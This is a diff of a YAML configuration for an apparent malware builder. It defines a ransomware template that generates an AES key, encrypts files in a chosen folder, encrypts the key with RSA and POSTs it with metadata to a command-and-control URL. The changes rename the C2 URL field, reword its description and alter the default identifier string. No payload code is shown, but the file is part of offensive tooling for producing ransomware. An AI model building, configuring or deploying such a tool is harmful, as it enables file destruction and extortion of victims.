@@ -4,8 +4,8 @@ malware_type: "Ransomware"
 description: "A basic ransomware that generate an AES key, encrypt files, then encrypt the key using RSA and a base64 encoded public key and send the key with some basic metadata to a C2 URL using POST"
 template: "templates/base/kraken.py.j2"
 features:
-  - name: c2_url_kraken 
-    description: "URL du serveur C2"
+  - name: c2_url
+    description: "the URL where the key and some metadata will be sent"
     type: "string"
     mandatory: True
     default: ""
@@ -13,7 +13,7 @@ features:
     description: "key to identify which malware has send the data to the C2, used by Scylla"
     type: "string"
     mandatory: False
-    default: "ThisIsKrakenRansomwareV3"
+    default: "Release-the-KRAKEN"
   - name: folder_path
     description: "the path where the file will be encrypted, use onlu / or double \\"
     type: "string"
